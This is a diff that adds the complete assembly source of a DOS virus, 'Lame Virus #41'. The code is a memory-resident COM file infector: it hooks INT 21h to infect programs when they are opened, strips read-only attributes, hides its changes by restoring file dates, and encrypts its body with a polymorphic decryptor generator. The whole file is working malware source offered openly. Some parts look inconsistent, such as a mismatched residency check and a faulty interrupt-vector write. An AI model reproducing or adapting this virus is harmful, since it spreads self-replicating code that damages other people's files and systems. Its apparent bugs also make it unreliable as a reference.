@@ -1,0 +1,962 @@
+Lame Virus #41
+Executioner
++------------------------------------------------------------------------------+
+| Lame Virus #41							       |
+| by Executioner/LT							       |
+|   o resident parasitic COM infector					       |
+|   o infects on open							       |
+|   o preserves time/date						       |
+|   o infects read-only files						       |
+|   o goes resident by direct MCB shrinking				       |
+|   o tunnels by checking interrupt 20h - doesn't work if DOS is loaded low    |
+|   o slightly polymorphic						       |
+|   o critical error handler						       |
++------------------------------------------------------------------------------+
+
+masm51
+quirks
+_ax=0+8
+_bx=3+8
+_cx=1+8
+_dx=2+8
+_si=6+8
+_di=7+8
+_sp=4+8
+_bp=5+8
+_al=0
+_bl=3
+_cl=1
+_dl=2
+_ah=4
+_bh=7
+_ch=5
+_dh=6
+
+.286
+.model	tiny
+.code
+v_length equ v_finish-v_start
+m_length equ m_finish-v_start
+num_para equ (m_length+15)/16
+	org	0
+v_start:
+	pusha				; save general registers
+	pushf				; save the flags
+	call	delta			; get the offset from initial
+delta:
+	mov	bp, sp
+	mov	bp, [bp]
+	sub	bp, offset delta
+	add	sp, 2
+	mov	ax, 42ffh		; do installation check
+	int	21h
+	cmp	bx, 1234		; if bx=1234 then already resident
+	je	return
+	mov	ax, ds
+	dec	ax
+	mov	ds, ax
+	mov	byte ptr ds:[0], 'Z'    ; fix up the host's MCB
+	sub	word ptr ds:[3], num_para+1
+	sub	word ptr ds:[12h], num_para+1
+	mov	ax, word ptr ds:[12h]
+	mov	ds, ax
+	mov	byte ptr ds:[0], 'Z'    ; make a new MCB
+	mov	word ptr ds:[1], 8
+	mov	word ptr ds:[3], num_para
+	inc	ax
+	mov	es, ax
+	push	cs
+	pop	ds
+	sub	di, di
+	mov	si, bp
+	push	di
+	mov	cx, v_length		; move v_length bytes
+	rep	movsb			; move it
+	pop	ds
+	mov	si, 84h 		; get the current int 21 from IVT
+	mov	di, offset real_int21
+	movsw
+	movsw
+	lds	si, dword ptr ds:[80h]	; now try to tunnel via int 20h
+	cmp	byte ptr [si], 0eah	; if no jump, not resident in HMA
+	jnz	@f
+	cmp	byte ptr [si+5], 0eah	; if no jump, not resident in HMA
+	jnz	@f
+	add	si, 6			; if it worked, then copy the
+	mov	di, offset real_int21	; int 21h handler address
+	movsw
+	movsw
+@@:
+	sub	ax, ax			; now must get address to pass
+	mov	ds, ax			; control to... can't use real
+	mov	si, 84h 		; int 21 because that will bypass
+	mov	di, offset old_int21	; any installed TSRs, and deactivate
+	movsw				; them
+	movsw
+	cli
+	mov	word ptr ds:[84h], offset new_int21
+	mov	word ptr ds:[86h], es
+	sti
+	push	cs			; set all segments to cs
+	pop	ds
+	push	cs
+	pop	es
+return:
+	lea	si, [bp+save]		; now move the original host start
+	mov	di, 100h		; to CS:100h
+	movsb
+	movsw
+	popf				; restore the flags
+	popa				; restore the general registers
+	push	100h			; this way preserves ALL registers
+	retn				; =jmp cs:100h
+big_garble_table:
+	dw	offset double_xchg
+	dw	offset push_pop
+	dw	offset pusha_popa
+	dw	offset nowhere_jump
+	dw	offset push_pop_swap
+	dw	offset random_read
+	dw	offset random_segread
+	dw	offset write_to_bios
+	dw	offset write_to_upper_vgamem
+	dw	offset dummy_int_call
+	dw	offset move_garbage_to_unused
+save	db	0cdh, 20h, 90h
+jmp_code db	0e9h
+jmp_offset dw	?
+id_stuff db	"Lame41 [Executioner]"
+extension db	4 dup (0)
+;db	 0
+; on entry to the mutation routine, ds and cs are both the segment of the
+; virus, ax holds the length of the file being infected
+encrypt:
+	push	es
+	push	bx
+	push	si
+	push	di
+	push	bp
+	mov	[file_len], ax		; save the file length
+	mov	[patch_count], 0	; zero the counter variable
+	mov	[used_register], 0
+	call	random
+	mov	[key], ax
+	mov	di, offset enc_buf
+	sub	si, si
+	push	ax
+	call	random
+	test	al, 1
+	pop	ax
+	jz	algorithm_2
+algorithm_1:
+temp_val1=1 shl _ax+1 shl _si+1 shl _di+1 shl _cx
+temp_val2=temp_val1+1 shl _ah+1 shl _al+1 shl _cl+1 shl _ch
+	mov	[used_register], temp_val2
+	call	_generate_garbage
+	mov	ax, 6+8 		; si
+	mov	cx, 1			; start of encrypted
+	call	_mov
+	call	_generate_garbage
+	mov	ax, 7+8 		; di
+	mov	cx, 1			; start of encrypted
+	call	_mov
+	call	_generate_garbage
+	mov	ax, 1+8 		; cx
+	mov	bx, v_length
+	mov	cx, 0			; type is none
+	call	_garble_mov
+	call	_generate_garbage
+	mov	[loc_loop_start], di
+	call	_generate_garbage
+	call	_lodsb
+	call	_generate_garbage
+	mov	ax, 0			; al
+	mov	bx, [key]
+	call	_xor_reg_imm
+	call	_generate_garbage
+	call	_stosb
+	call	_generate_garbage
+	mov	ax, [loc_loop_start]
+	sub	ax, di
+	dec	ax			; loop code length
+	dec	ax
+	call	_loop
+	jmp	done_algorithm
+algorithm_2:
+@@:					; now get the pointer register
+	call	_generate_garbage
+	call	random
+	and	ax, 0fh
+	cmp	al, 11			; bx
+	jz	@f
+	cmp	al, 13			; bp/di/si
+	jae	@f
+	jmp	@b
+@@:
+	mov	cl, al			; set the register to being used
+	mov	dx, 1
+	shl	dx, cl
+	or	[used_register], dx
+	cmp	ax, _bx 		; if BX, then BL and BL are used
+	jnz	@f
+	or	[used_register], 1 shl _bl+1 shl _bh
+@@:
+	mov	[pointer_reg], ax
+	mov	cx, 1			; type of patch
+	call	_mov
+	call	_generate_garbage
+	mov	[loc_loop_start], di
+	mov	ax, [pointer_reg]
+	mov	bx, [key]
+	call	_generate_garbage
+	call	_xor_mem_imm
+	mov	ax, [pointer_reg]
+	call	_generate_garbage
+	call	_inc
+	mov	ax, [pointer_reg]
+	mov	bx, 0
+	mov	cx, 2			; type of patch
+	call	_cmp
+	mov	ax, [loc_loop_start]	; calculate distance
+	sub	ax, di
+	dec	ax			; account for length of op
+	dec	ax
+	mov	ah, al
+	mov	al, 01110101b		; op for JNZ
+	stosw
+; now done creating the framework.
+done_algorithm:
+	mov	[loc_end_of_decryptor], di
+	mov	si, offset patch	; patch in values
+	mov	cx, [patch_count]	; 2?
+	jcxz	empty_patch_table
+@@:
+	lodsw				; type of patch
+	mov	bx, ax			; type in bx
+	lodsw				; location of patch
+	xchg	bx, ax			; type in ax, location in bx
+	cmp	ax, 1			; the location of the start of data
+	jz	patch_start
+	cmp	ax, 2			; the location of eof
+	jz	patch_eof_p1
+	jmp	patch_done
+patch_eof_p1:
+	mov	ax, [loc_end_of_decryptor]
+	sub	ax, offset enc_buf-100h
+	add	ax, [file_len]
+	add	ax, v_length+1
+	mov	[bx], ax
+	jmp	patch_done
+patch_start:
+	mov	ax, [loc_end_of_decryptor]
+	sub	ax, offset enc_buf-100h 	 ; adjust for memory position
+	add	ax, [file_len]		; add the file length
+	mov	ds:[bx], ax
+patch_done:
+	loop	@b
+empty_patch_table:
+	mov	cx, v_length		; now encrypt it with XOR
+	mov	si, 0
+@@:
+	lodsb
+	xor	al, byte ptr [key]
+	stosb
+	loop	@b
+	mov	cx, [loc_end_of_decryptor] ; set up for DS:DX and CX
+	sub	cx, offset enc_buf-v_length		; to hold the right numbers
+	mov	dx, offset enc_buf
+	pop	bp
+	pop	di
+	pop	si
+	pop	bx
+	pop	es
+	retn
+seed	dw	?
+get_patch_loc_bx:
+	mov	bx, [patch_count]	; get loc in patch table
+	inc	[patch_count]
+	shl	bx, 2			; two words per entry
+	retn
+_xor_reg_imm:
+	push	ax
+	push	ax
+	cmp	al, 0			; al
+	jnz	@f
+	jmp	_xor_reg_imm_ax_d
+@@:
+	cmp	al, 8
+	jnz	@f
+_xor_reg_imm_ax_d:
+	push	ax		; save register
+	call	random
+	test	al, 1
+	pop	ax		; restore register
+	jz	_xor_reg_imm_ax
+@@:
+	ror	ax, 3		; word bit -> lsb
+	shr	ah, 5		; reg -> lsb/high byte
+	or	ah, 11110000b
+	or	al, 80h
+	stosw
+_xor_handle_bw:
+	pop	ax
+	test	al, 1000b	; check word bit
+	jz	_xor_byte
+	mov	ax, bx
+	stosw
+	jmp	_xor_done
+_xor_byte:
+	mov	ax, bx
+	stosb
+_xor_done:
+	pop	ax
+	retn
+_xor_reg_imm_ax:
+	mov	ah, al
+	mov	al, 110100b
+	shr	ah, 3		; word bit -> lsb
+	or	al, ah
+	stosb
+	jmp	_xor_handle_bw
+_loop:
+	push	ax
+	mov	ah, al
+	mov	al, 0e2h
+	stosw
+	pop	ax
+	retn
+_lodsb:
+	push	ax
+	mov	al, 0ach
+	stosb
+	pop	ax
+	retn
+_stosb:
+	push	ax
+	mov	al, 0aah
+	stosb
+	pop	ax
+	retn
+_garble_mov:
+	push	ax
+	push	bx
+	push	cx
+	push	dx
+
+	push	ax
+	call	random
+	mov	dx, ax
+	pop	ax
+	test	dx, 4
+	jnz	@f
+	call	_mov			; do a straight mov reg
+	jmp	_garble_mov_2
+@@:					; do a mov reg + sub/add reg
+	sub	bx, dx
+	call	_mov
+	mov	bx, dx
+	push	ax
+	call	random
+	test	al, 1
+	pop	ax
+	jz	_garble_mov_1
+	call	_add_imm
+	jmp	_garble_mov_2
+_garble_mov_1:
+	neg	bx
+	call	_sub_imm
+_garble_mov_2:
+	pop	dx
+	pop	cx
+	pop	bx
+	pop	ax
+	retn
+_mov:
+	push	ax
+	or	al, 0b0h
+	stosb
+	mov	ax, bx
+	stosw
+	call	get_patch_loc_bx
+	mov	ax, di
+	dec	ax
+	dec	ax
+	mov	[patch+bx], cx
+	mov	[patch+bx+2], ax
+	pop	ax
+	retn
+_cmp:
+	push	ax
+	push	bx
+	push	ax		; save ax
+	call	random		; get random number
+	test	ax, 1		; 1 in 2 chance
+	pop	ax		; restore ax
+	jz	_cmp_2
+_cmp_1:
+	ror	ax, 3
+	shr	ah, 5
+	or	al, 80h
+	or	ah, 11111000b
+	stosw
+	mov	ax, bx			; store immediate
+	stosw
+	call	get_patch_loc_bx
+	mov	ax, di
+	sub	ax, 2
+	mov	[patch+bx], cx		; type of patch
+	mov	[patch+bx+2], ax	; location of patch
+	jmp	_cmp_3
+_cmp_2:
+	call	_push_reg		; store the register
+	call	_sub_imm		; subtract and set flags
+	call	_pop_reg		; restore the register
+	call	get_patch_loc_bx
+	mov	ax, di
+	sub	ax, 3
+	mov	[patch+bx], cx
+	mov	[patch+bx+2], ax
+_cmp_3:
+	pop	bx
+	pop	ax
+	retn
+_push_reg:
+	push	ax
+	and	al, 7
+	or	al, 50h
+	stosb
+	pop	ax
+	retn
+_pop_reg:
+	push	ax
+	and	al, 7
+	or	al, 58h
+	stosb
+	pop	ax
+	retn
+_pusha:
+	push	ax
+	mov	al, 60h
+	jmp	@f
+_popa:
+	push	ax
+	mov	al, 61h
+@@:
+	stosb
+	pop	ax
+	retn
+; 100000sw  mod,110,r/m  disp(0,1,2)  data (1,2)
+
+; 10000000  00110111  xxxxxxxx
+;		 ^^^
+;		 BX - sub in whatever else
+; 10000000  01110110  00000000 xxxxxxxx
+; this form is for [BP] because no short form exists
+; r/m values:
+; BX+SI 000
+; BX+DI 001
+; BP+SI 010
+; BP+DI 011
+; SI  - 100
+; DI  - 101
+; BP  - 110
+; BX  - 111
+_xor_mem_imm:				; xor the [reg] in ax with bx
+	push	ax
+	cmp	al, 6+8 		  ; si
+	jnz	@f
+	mov	ah, 00110100b
+	jmp	_xor_mem_1
+@@:
+	cmp	al, 7+8 		  ; di
+	jnz	@f
+	mov	ah, 00110101b
+	jmp	_xor_mem_1
+@@:
+	cmp	al, 3+8 		  ; bx
+	jnz	@f
+	mov	ah, 00110111b
+	jmp	_xor_mem_1
+@@:
+	mov	ah, 01110110b		; bp
+_xor_mem_1:
+	push	ax
+	mov	al, 80h
+	stosw
+	pop	ax
+	cmp	al, 5+8
+	jnz	@f
+	mov	al, 0			; for bp, store the 0 offset
+	stosb
+@@:
+	mov	al, bl			; store immediate value
+	stosb
+	pop	ax
+	retn
+_inc:
+	push	ax
+	call	random
+	mov	bl, al
+	pop	ax
+	and	bl, 3
+	cmp	bl, 0
+	jz	_inc_0
+	cmp	bl, 1
+	cmp	bl, 2
+					; add <reg>, random
+					; sub <reg>, random-1
+	push	ax
+	call	random
+	mov	bx, ax
+	pop	ax
+	call	_add_imm
+	dec	bx
+	call	_sub_imm
+	retn
+_inc_0: 				; inc <wreg>
+	and	al, 7
+	or	al, 40h
+	stosb
+	retn
+_inc_1: 				; add <reg>, 1
+	mov	bx, 1
+	call	_add_imm
+	retn
+_inc_2: 				; sub <reg>, -1
+	mov	bx, -1
+	call	_sub_imm
+	retn
+_add_imm:				; add bx to the register in ax
+	push	ax
+	mov	ah, 0			; sign bit is always clear now
+	ror	ax, 3			; now mod holds reg, and w holds w
+	or	al, 80h 		; set bit for ADD instruction
+	shr	ah, 5
+	or	ah, 0c0h		; set mod field to 10b
+	stosw
+	mov	ax, bx
+	stosw
+	pop	ax
+	retn
+_sub_imm:
+	push	ax
+	ror	ax, 3			; put w bit in place and move reg
+	shr	ah, 5			; now put reg field in place
+	or	ah, 0e8h		; set mod field and make it a SUB
+	or	al, 80h
+	stosw
+	mov	ax, bx
+	stosw
+	pop	ax
+	retn
+
+_generate_garbage:
+	push	ax
+	call	random
+	and	al, 03h
+	cmp	al, 1
+	jnz	@f
+	jmp	garbage_onebyte
+@@:
+	cmp	al, 2
+	jz	garbage_big
+	pop	ax
+	retn
+garbage_big:
+	push	si
+@@:
+	call	random
+	and	ax, 0fh
+	cmp	al, 9
+	ja	@b
+	shl	ax, 1
+	mov	si, ax
+	push	offset @f
+	jmp	word ptr [si+big_garble_table]
+@@:
+	pop	si
+	pop	ax
+	retn
+get_unused_register:
+	push	cx
+	push	dx
+get_unused_1:
+	call	random
+	and	ax, 0fh
+	cmp	ax, _sp 		; don't mess with the stack
+	jz	get_unused_1
+	mov	dx, 1
+	mov	cl, al
+	shl	dx, cl
+	test	[used_register], dx
+	jnz	get_unused_1
+	pop	dx
+	pop	cx
+	retn
+push_pop_swap:
+	push	ax
+@@:
+	call	get_unused_register
+	test	al, 1000b		; make sure it's word length
+	jz	@b
+	call	_push_reg
+@@:
+	call	get_unused_register
+	test	al, 1000b		; make sure it's word length
+	jz	@b
+	call	_pop_reg
+	pop	ax
+	retn
+; shouldn't set off garbage flags - it's not acting on uninitialized data,
+; it's initializing data instead.
+move_garbage_to_unused:
+	push	ax
+	push	bx
+	push	cx
+	push	dx
+	call	random
+	mov	bx, ax
+	mov	cx, 0
+	call	get_unused_register
+	call	_mov
+	pop	dx
+	pop	cx
+	pop	bx
+	pop	ax
+	retn
+double_xchg:
+	call	random
+	and	ax, 07h
+	add	ax, 8
+	mov	bx, ax
+	call	random
+	and	ax, 7
+	add	ax, 8
+	call	_xchg_reg_reg
+	call	_xchg_reg_reg
+	retn
+push_pop:
+	call	random
+	call	_push_reg
+	call	_pop_reg
+	retn
+pusha_popa:
+	call	_pusha
+	call	_popa
+	retn
+nowhere_jump:
+	push	ax
+	push	si
+	call	random
+	and	ax, 07h
+	mov	cx, ax
+	call	random
+	test	al, 1
+	jz	@f
+	mov	al, 0e9h	; near jump
+	stosb
+	mov	ax, cx
+	stosw
+	jmp	nowhere_jump_1
+@@:
+	mov	al, 0ebh	; short jump
+	mov	ah, cl
+	stosw
+nowhere_jump_1:
+	call	random		; get random location to read from
+	mov	si, ax
+	rep	movsb		; move random data in to fill gap
+	pop	si
+	pop	ax
+	retn
+random_seg_override:
+	push	ax
+	push	bx
+	call	random
+	and	al, 3
+	cmp	al, 1
+	jnz	@f
+	mov	bx, offset seg_override_table
+	call	random
+	and	ax, 3			; limit from 0-3
+	xlatb				; get override byte
+	stosb				; save it
+@@:
+	pop	bx
+	pop	ax
+	retn
+seg_override_table db 2eh, 3eh, 26h, 36h  ; CS/DS/ES/SS in order
+random_read:
+	push	ax
+	call	random_seg_override
+	call	get_unused_register
+	ror	ax, 3
+	shr	ah, 2
+	or	ah, 00000110b
+	or	al, 8ah
+	stosw
+	call	random
+	stosw
+	pop	ax
+	retn
+random_segread:
+	retn
+write_to_bios:
+	retn
+write_to_upper_vgamem:
+	retn
+dummy_int_call:
+	push	ax
+	push	bx
+	push	cx
+	call	_pusha			; save all regs
+@@:
+	call	random
+	and	ax, 0fh
+	cmp	al, 9
+	jae	@b
+	shl	ax, 1
+	mov	si, ax
+	mov	ax, _ax
+	mov	bx, word ptr [dummy_int_table+si] ; value to put in AX
+	mov	cx, 0			; do no patch
+	call	_mov
+	mov	ax, 21cdh		; encode an INT 21
+	stosw
+	call	_popa			; restore all regs
+	pop	cx
+	pop	bx
+	pop	ax
+	retn
+dummy_int_table:
+	dw	3303h
+	dw	3304h
+	dw	2a00h
+	dw	2c00h
+	dw	3000h
+	dw	3305h
+	dw	3306h
+	dw	1800h
+	dw	1900h
+garbage_onebyte:
+	push	bx
+	call	random
+	and	al, 07h
+	mov	bx, offset onebyte_table
+	xlatb
+	stosb
+	pop	bx
+	pop	ax
+	retn
+onebyte_table:
+	stc
+	cmc
+	clc
+	int	3
+	sti
+	lock
+	stc
+	cmc
+_xchg_reg_reg:
+	push	ax
+	push	bx
+	ror	ax, 3
+	or	al, 86h
+	or	ah, 11000000b		; two register
+	and	bl, 7			; strip high but from nybble
+	shl	bx, 3
+	or	ah, bl
+	stosw
+	pop	bx
+	pop	ax
+	retn
+random:
+	push	cx
+	push	dx
+	in	al, 40h
+	xor	[seed], ax
+	mov	ax, [seed]
+	mov	cx, 12345
+	mul	cx
+	add	ax, 12345
+	mov	[seed], ax
+	pop	dx
+	pop	cx
+	retn
+do_int21:
+	pushf
+	call	dword ptr cs:[real_int21]
+	retn
+new_int21:
+	pushf
+	cmp	ax, 42feh
+	jnz	@f
+	mov	bx, 1233
+	popf
+	iret
+@@:
+	cmp	ah, 3dh
+	jnz	do_orig_int
+	call	infect_file
+do_orig_int:
+	popf
+	db	0eah
+old_int21 dd	?
+real_int21 dd	?
+; filename in DS:DX
+infect_file:
+	pusha				; save general registers
+	push	ds			; save data segment
+	push	es			; save extra segment
+	mov	di, dx			; ES:DI -> filename
+	push	ds			; ES holds segment of filename
+	pop	es
+	mov	al, 0			; search for ASCIIZ terminator
+	mov	cx, 0ffh		; max length to scan is 256 bytes
+	repne	scasb
+	sub	di, 5			; ES:DI now holds start of extension
+	mov	bx, 0			; set base pointer to 0
+	mov	cx, 4			; move 4 characters
+move_extension:
+	mov	al, ds:[bx+di]		; get character
+	cmp	al, 'a'                 ; check if inside bounds of the
+	jb	upcase_ok		; lowercase character set
+	cmp	al, 'z'
+	ja	upcase_ok
+	sub	al, 32			; lowercase -> uppercase
+upcase_ok:
+	mov	cs:[bx+extension], al	; store new character
+	inc	bx			; increase base pointer
+	loop	move_extension		; do another character
+	cmp	word ptr cs:[extension], 'C.'  ; check if the filename ends
+	jz	@f			; with the ".COM" extension
+	jmp	not_com
+@@:
+	cmp	word ptr cs:[extension+2], 'MO'
+	jz	@f
+	jmp	not_com
+@@:
+	call	install_int24
+	mov	ax, 4300h		; get attributes in CX
+	call	do_int21
+	push	cx			; save attribs
+	push	ds			; save location of filename
+	push	dx
+	sub	cx, cx			; clear all attribs
+	mov	ax, 4301h		; set attributes
+	push	ax
+	call	do_int21
+	cmp	al, 3			; check if crit error happened
+	jnz	@f
+	add	sp, 8
+	jmp	not_com
+@@:
+	mov	ax, 3d02h		; open in read/write
+	call	do_int21
+	jc	error_in_opening
+	xchg	bx, ax
+	mov	ax, 5700h		; get time/date in CX/DX
+	call	do_int21
+	push	cx			; save time
+	push	dx			; save date
+	push	cs			; set DS to code segment
+	pop	ds
+	push	cs			; set ES to code segment
+	pop	es
+	mov	ah, 3fh 		; read from file
+	mov	cx, 3			; 3 bytes
+	mov	dx, offset save 	; save it in 'save'
+	call	do_int21
+	mov	ax, word ptr [save]	; get first word of host file
+	xor	ax, 1234h		; garble it
+	cmp	al, 0e9h xor 34h	; check for initial jump
+	je	already_infected	; jump=infected
+	cmp	ax, 'MZ' xor 1234h      ; check if it is an EXE
+	je	already_infected	; leave if it is
+	cmp	ax, 'ZM' xor 1234h      ; check if it is an EXE
+	je	already_infected	; leave if it is
+	mov	ax, 4202h		; seek to eof
+	sub	cx, cx			; zero CX
+	cwd				; zero DX
+	call	do_int21		; get filesize to DX:AX
+	sub	ax, 3			; account for jmp length
+	mov	[jmp_offset], ax	; create new jump
+	add	ax, 3			; AX holds filesize now
+	call	encrypt 		; call mutation routine
+	mov	ah, 40h 		; write to file
+	call	do_int21
+	mov	ax, 4200h		; seek to start of file
+	sub	cx, cx			; zero CX
+	cwd				; zero DX
+	call	do_int21
+	mov	ah, 40h 		; write to handle
+	mov	cx, 3			; 3 bytes
+	mov	dx, offset jmp_code	; data=the jump
+	call	do_int21
+already_infected:
+	pop	dx			; get date from stack
+	pop	cx			; get time from stack
+	mov	ax, 5701h		; set date
+	call	do_int21
+	mov	ah, 3eh 		; close handle
+	call	do_int21
+error_in_opening:
+	pop	ax			; get 4301 (set attribs)
+	pop	dx			; get filename offset
+	pop	ds			; get filename segment
+	pop	cx			; get attribs
+	call	do_int21
+	call	uninstall_int24
+not_com:
+	pop	es			; restore es
+	pop	ds			; restore ds
+	popa				; restore general registers
+	retn				; return to the interrupt handler
+install_int24:
+	pusha
+	push	ds
+	sub	ax, ax
+	mov	ds, ax
+	lds	bx, dword ptr ds:[24h*4]
+	mov	word ptr cs:[old_int24], bx
+	mov	word ptr cs:[old_int24], ds
+	mov	ds, ax
+	cli
+	mov	word ptr ds:[24h*4], offset new_int24
+	mov	word ptr ds:[24h*4], cs
+	sti
+	pop	ds
+	popa
+	retn
+uninstall_int24:
+	pusha
+	push	ds
+	push	es
+	sub	ax, ax
+	mov	es, ax
+	push	cs
+	pop	ds
+	sub	di, di
+	mov	si, offset old_int24
+	movsw
+	movsw
+	pop	es
+	pop	ds
+	popa
+	retn
+new_int24:
+	mov	al, 3
+	iret
+v_finish:
+used_register	dw	?		; which registers are in use
+old_int24 dd	?
+pointer_reg dw	?			; the reg used in algorithm 2
+file_len dw	?			; the length of the host
+loc_end_of_decryptor dw  ?	    ; the offset of the end of the decryptor
+loc_loop_start	dw ?			; offset of the decryption loop
+patch_count dw	?			; number of things to patch
+key	dw	?			; the key to encrypt with
+patch	dw	40h dup (0)		; space for 16 entries
+enc_buf db	(v_length+50) dup (0)	; location to hold decryptor+data
+m_finish:
+	end	v_start
